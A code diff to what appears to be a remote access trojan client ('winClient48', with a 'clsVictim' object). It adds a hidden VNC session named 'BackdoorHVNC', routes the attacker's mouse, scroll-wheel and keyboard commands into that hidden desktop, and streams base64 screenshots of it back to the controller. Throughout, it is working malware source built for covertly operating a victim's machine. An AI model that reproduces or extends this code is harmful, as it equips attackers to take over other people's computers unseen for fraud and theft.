@@ -233,6 +233,8 @@ namespace winClient48
         private clsfnRunScript funcRunScript;        //Run customized script.
         private clsfnFun funcFun;                    //Funny.
         private clsInstaller installer;              //Installer
+        
+        private clsfnHvncSession funcHvncSession  = new clsfnHvncSession("BackdoorHVNC");
 
         //WEBCAM
         static clsfnWebcam webcam;
@@ -1653,10 +1655,15 @@ namespace winClient48
                     }
                     else if (cmd[1] == "move")
                     {
-                        Cursor.Position = new Point(int.Parse(cmd[2]), int.Parse(cmd[3]));
+                        //Cursor.Position = new Point(int.Parse(cmd[2]), int.Parse(cmd[3]));
+
+                        int x = int.Parse(cmd[2]);
+                        int y = int.Parse(cmd[3]);
+                        funcHvncSession.fnHandleMouseInput("move", x, y);
                     }
                     else if (cmd[1] == "btn")
                     {
+                        /*
                         switch (cmd[2])
                         {
                             case "RD":
@@ -1681,6 +1688,23 @@ namespace winClient48
                                 funcMouse.MouseSC(int.Parse(cmd[3]));
                                 break;
                         }
+                        */
+
+                        string action = cmd[2]; //"LD", "LU", etc.
+                        int x = int.Parse(cmd[3]);
+                        int y = int.Parse(cmd[4]);
+
+                        if (action == "SC")
+                        {
+                            int delta = int.Parse(cmd[5]);
+                            IntPtr wParam = (IntPtr)((delta << 16));
+                            IntPtr hWnd = WinAPI.WindowFromPoint(new Point(x, y));
+                            WinAPI.PostMessage(hWnd, 0x020A, wParam, (IntPtr)((y << 16) | (x & 0xFFFF)));
+                        }
+                        else
+                        {
+                            funcHvncSession.fnHandleMouseInput(action, x, y);
+                        }
                     }
                 }
 
@@ -1697,6 +1721,7 @@ namespace winClient48
 
                     if (cmd[1] == "vk")
                     {
+                        /*
                         Keys key = (Keys)int.Parse(cmd[3]);
                         if (cmd[2] == "down")
                         {
@@ -1706,6 +1731,11 @@ namespace winClient48
                         {
                             keyboard.KeyUp(key);
                         }
+                        */
+
+                        string action = cmd[2];
+                        int vk = int.Parse(cmd[3]);
+                        funcHvncSession.fnHandleKeyboardInput(action, vk);
                     }
                     else if (cmd[1] == "enable")
                     {
@@ -3098,11 +3128,25 @@ namespace winClient48
         /// <param name="height"></param>
         void DesktopStart(clsVictim v, string device_name, int width, int height)
         {
+            funcHvncSession.fnStartExplorer();
             while (is_connected && send_screenshot)
             {
+                /*
                 Bitmap bmp = fnScreenShot(v, device_name, width, height);
                 string b64_img = clsGlobal.BitmapToBase64(bmp);
                 v.SendCommand("desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
+                */
+
+                Bitmap bmp = funcHvncSession.fnGetScreenshot(width, height);
+                string b64 = clsGlobal.BitmapToBase64(bmp);
+                v.fnSendCommand(new string[]
+                {
+                    "desktop",
+                    "start",
+                    b64,
+                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
+                });
+
                 Thread.Sleep(m_nDesktopDelay);
             }
             send_stopped = true;
